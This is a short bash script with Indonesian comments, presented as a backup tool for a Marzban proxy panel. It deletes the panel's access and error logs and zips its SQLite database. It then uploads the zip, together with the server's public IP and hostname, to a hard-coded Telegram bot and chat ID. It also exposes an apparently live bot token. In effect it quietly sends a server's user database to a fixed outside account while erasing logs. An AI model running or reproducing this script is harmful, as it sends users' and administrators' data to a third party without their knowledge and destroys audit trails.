#!/bin/bash

# Path ke direktori yang berisi file
directory="/var/lib/marzban/"

# Hapus file access.log
rm -f "${directory}access.log"

# Hapus file error.log
rm -f "${directory}error.log"

# Path ke file db.sqlite3
db_file="/var/lib/marzban/db.sqlite3"

# Path untuk menyimpan file backup
backup_dir="/root/"

# Membersihkan backup sebelumnya, jika ada
rm -f "${backup_dir}backupdata.zip"

# Membuat backup dari file db.sqlite3
zip -j "${backup_dir}backupdata.zip" "$db_file"

# Menyimpan informasi waktu backup (hanya tanggal dan waktu)
BACKUP_DATE=$(date +"%Y-%m-%d %I:%M:%S %p")

# Menyimpan informasi alamat IP publik
IP_ADDRESS=$(curl -s ifconfig.me)

# Menyimpan informasi nama client (Hostname dari VPS)
CLIENT_NAME=$(hostname)

# Mengirim file backup ke bot Telegram
curl -F chat_id="335842883" \
     -F caption=$'successfully backup your database !\nplease save this information\n=================================\nIP Address : <code>'"$IP_ADDRESS</code>"$'\nClient Name : <code>'"$CLIENT_NAME</code>"$'\nBackup Date : <code>'"$BACKUP_DATE</code>"$'\n=================================' \
     -F parse_mode="HTML" \
     -F document=@"${backup_dir}backupdata.zip" \
     -F reply_markup='{"inline_keyboard":[[{"text":"👻 Cowok Sange 👻","url":"tg://settings/"}]]}' \
     https://api.telegram.org/bot6407054122:AAEdBIEzbDznBoSvKEM1JkBIKwlBdFIi59k/sendDocument

# Menampilkan pesan bahwa backup telah berhasil dengan warna hijau
echo -e "\033[0;32msuccessfully backup your database !\033[0m"